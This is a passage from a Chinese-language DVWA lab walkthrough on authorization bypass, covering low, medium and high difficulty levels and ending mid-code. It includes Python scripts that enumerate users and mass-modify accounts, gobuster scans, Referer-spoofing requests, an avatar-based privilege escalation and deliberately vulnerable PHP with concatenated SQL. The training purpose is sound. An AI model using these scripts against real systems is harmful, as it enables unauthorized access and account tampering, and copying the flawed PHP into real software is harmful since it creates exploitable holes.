+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">普通用户登录后：</span><br><span class="line"></span><br><span class="line">访问：?action=delete&amp;delete_id=1</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="bullet">- </span>管理员账户被删除</span><br><span class="line"><span class="bullet">- </span>普通用户执行了管理员操作</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：批量攻击"><a href="#步骤3：批量攻击" class="headerlink" title="步骤3：批量攻击"></a>步骤3：批量攻击</h4><p><strong>Python脚本 - 枚举所有用户：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Enumerating users...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    params = &#123;<span class="string">&#x27;id&#x27;</span>: user_id&#125;</span><br><span class="line">    response = requests.get(url, params=params, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID:&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="comment"># 提取用户信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found user ID: <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析用户名和密码哈希</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Username:&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment"># 提取信息（需要解析HTML）</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Details in response&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python脚本 - 批量修改用户：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Modifying all users...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;hacked_<span class="subst">&#123;user_id&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;update&#x27;</span>: <span class="string">&#x27;Update&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;updated successfully&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified user <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to modify user <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤4：查找隐藏的管理功能"><a href="#步骤4：查找隐藏的管理功能" class="headerlink" title="步骤4：查找隐藏的管理功能"></a>步骤4：查找隐藏的管理功能</h4><p><strong>目录枚举：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用dirbuster或gobuster</span></span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://dvwa.local/vulnerabilities/authbypass/ \</span><br><span class="line">             -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \</span><br><span class="line">             -c <span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见管理路径</span></span><br><span class="line">/admin</span><br><span class="line">/administrator</span><br><span class="line">/admin.php</span><br><span class="line">/manage</span><br><span class="line">/panel</span><br><span class="line">/dashboard</span><br></pre></td></tr></table></figure>
+
+<p><strong>功能枚举：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">尝试不同的action参数：</span><br><span class="line">?<span class="attribute">action</span>=delete</span><br><span class="line">?<span class="attribute">action</span>=update</span><br><span class="line">?<span class="attribute">action</span>=view</span><br><span class="line">?<span class="attribute">action</span>=export</span><br><span class="line">?<span class="attribute">action</span>=backup</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用Referer检查，但可以伪造。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前用户</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：检查Referer头 ★★★</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_REFERER&#x27;] - HTTP Referer头</span></span><br><span class="line"><span class="comment">// 作用：检查请求是否来自本站</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 问题：</span></span><br><span class="line"><span class="comment">// 1. Referer可以被伪造</span></span><br><span class="line"><span class="comment">// 2. 某些浏览器/代理可能不发送Referer</span></span><br><span class="line"><span class="comment">// 3. 这不是可靠的安全检查</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 检查Referer是否包含当前域名 ★★★</span></span><br><span class="line">    <span class="comment">// strpos() - 查找字符串位置</span></span><br><span class="line">    <span class="comment">// $_SERVER[&#x27;HTTP_HOST&#x27;] - 当前域名</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 例如：</span></span><br><span class="line">    <span class="comment">// Referer: http://dvwa.local/vulnerabilities/authbypass/index.php</span></span><br><span class="line">    <span class="comment">// HTTP_HOST: dvwa.local</span></span><br><span class="line">    <span class="comment">// strpos() 找到 &quot;dvwa.local&quot; → 通过检查</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$referer</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// Referer不包含当前域名，拒绝</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: Invalid referer&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ★★★ 问题：没有Referer也拒绝 ★★★</span></span><br><span class="line">    <span class="comment">// 某些情况下，合法用户的浏览器可能不发送Referer</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: No referer&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：简单的角色检查 ★★★</span></span><br><span class="line"><span class="comment">// 检查用户是否有admin_role权限</span></span><br><span class="line"><span class="comment">// 但这个检查有漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 从数据库查询用户角色</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 问题：角色信息存储在客户端可见的字段 ★★★</span></span><br><span class="line">        <span class="comment">// 如果avatar或其他字段包含&quot;admin&quot;字符串，就认为是管理员</span></span><br><span class="line">        <span class="comment">// 这是非常弱的检查</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>[<span class="string">&#x27;avatar&#x27;</span>], <span class="string">&#x27;admin&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户ID</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进：检查用户权限 ★★★</span></span><br><span class="line"><span class="comment">// 但检查逻辑有漏洞</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAdmin</span>(<span class="variable">$currentUser</span>)) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 问题：只检查是否是管理员，不检查是否查看自己的数据 ★★★</span></span><br><span class="line">    <span class="comment">// 非管理员应该只能查看自己的数据，但这里没有检查</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: Admin only&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后续操作...</span></span><br><span class="line"><span class="comment">// 查询、删除、修改用户</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>Referer检查</strong> - 验证请求来源</li>
+<li><strong>角色检查</strong> - 判断是否是管理员</li>
+<li><strong>拒绝无Referer的请求</strong></li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>Referer可伪造</strong> - 这不是可靠的安全措施</li>
+<li><strong>角色检查逻辑弱</strong> - 基于avatar字段判断</li>
+<li><strong>没有检查资源所有权</strong> - 管理员检查不够</li>
+<li><strong>Session劫持</strong> - 如果获取管理员Session，可以绕过</li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：伪造Referer头"><a href="#方法1：伪造Referer头" class="headerlink" title="方法1：伪造Referer头"></a>方法1：伪造Referer头</h4><p><strong>使用Burp Suite：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/vulnerabilities/authbypass/?id=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dvwa.local</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dvwa.local/vulnerabilities/authbypass/index.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>security=medium; PHPSESSID=your_session</span><br><span class="line"></span><br><span class="line"><span class="language-lasso">结果：通过<span class="keyword">Referer</span>检查</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用curl：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/?id=2&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Referer: http://dvwa.local/vulnerabilities/authbypass/&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Cookie: security=medium; PHPSESSID=your_session&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用Python：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/authbypass/&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://dvwa.local/vulnerabilities/authbypass/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url, params=params, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;User ID:&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Bypassed referer check!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：利用角色检查漏洞"><a href="#方法2：利用角色检查漏洞" class="headerlink" title="方法2：利用角色检查漏洞"></a>方法2：利用角色检查漏洞</h4><p><strong>如果avatar字段可修改：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 修改自己的avatar包含&quot;admin&quot;字符串</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: <span class="number">5</span>,  <span class="comment"># 当前用户ID</span></span><br><span class="line">    <span class="string">&#x27;avatar&#x27;</span>: <span class="string">&#x27;images/admin_avatar.jpg&#x27;</span>,  <span class="comment"># 包含&quot;admin&quot;</span></span><br><span class="line">    <span class="string">&#x27;update&#x27;</span>: <span class="string">&#x27;Update&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.post(url, data=data, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 现在被识别为管理员，可以访问所有功能</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：会话固定-x2F-劫持"><a href="#方法3：会话固定-x2F-劫持" class="headerlink" title="方法3：会话固定&#x2F;劫持"></a>方法3：会话固定&#x2F;劫持</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 获取管理员的Session ID（通过XSS、网络嗅探等）</span><br><span class="line"><span class="bullet">2.</span> 使用管理员的Session访问</span><br><span class="line"><span class="bullet">3.</span> 绕过所有权限检查</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用Anti-CSRF Token，但仍有逻辑漏洞。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前用户</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：Anti-CSRF Token验证 ★★★</span></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 验证CSRF Token ★★★</span></span><br><span class="line">    <span class="comment">// 从POST数据获取token</span></span><br><span class="line">    <span class="variable">$userToken</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 从Session获取token</span></span><br><span class="line">    <span class="variable">$sessionToken</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// checkToken() - 验证CSRF token</span></span><br><span class="line">    <span class="comment">// 参数1：用户提交的token</span></span><br><span class="line">    <span class="comment">// 参数2：Session中的token</span></span><br><span class="line">    <span class="comment">// 参数3：失败后重定向的页面</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">checkToken</span>(<span class="variable">$userToken</span>, <span class="variable">$sessionToken</span>, <span class="string">&#x27;index.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;CSRF token validation failed&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进：基于数据库的角色检查 ★★★</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUserRole</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 从数据库查询用户角色</span></span><br><span class="line">    <span class="comment">// 假设users表有role字段：&#x27;admin&#x27; 或 &#x27;user&#x27;</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT role FROM users WHERE user = ?&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_stmt_get_result</span>(<span class="variable">$stmt</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$row</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;user&#x27;</span>; <span class="comment">// 默认为普通用户</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户角色</span></span><br><span class="line"><span class="variable">$userRole</span> = <span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要访问的用户ID</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进：根据角色限制访问 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userRole</span> != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 问题：虽然检查了角色，但逻辑仍有漏洞 ★★★</span></span><br><span class="line">    <span class="comment">// 非管理员只能访问自己的数据</span></span><br><span class="line">    <span class="comment">// 但没有正确验证$userId是否是当前用户</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前用户的ID</span></span><br><span class="line">    <span class="variable">$currentUserId</span> = <span class="title function_ invoke__">getCurrentUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 逻辑漏洞：类型比较 ★★★</span></span><br><span class="line">    <span class="comment">// $_GET[&#x27;id&#x27;]是字符串，$currentUserId是整数</span></span><br><span class="line">    <span class="comment">// 如果使用==而不是===，可能被绕过</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$userId</span> != <span class="variable">$currentUserId</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You can only view your 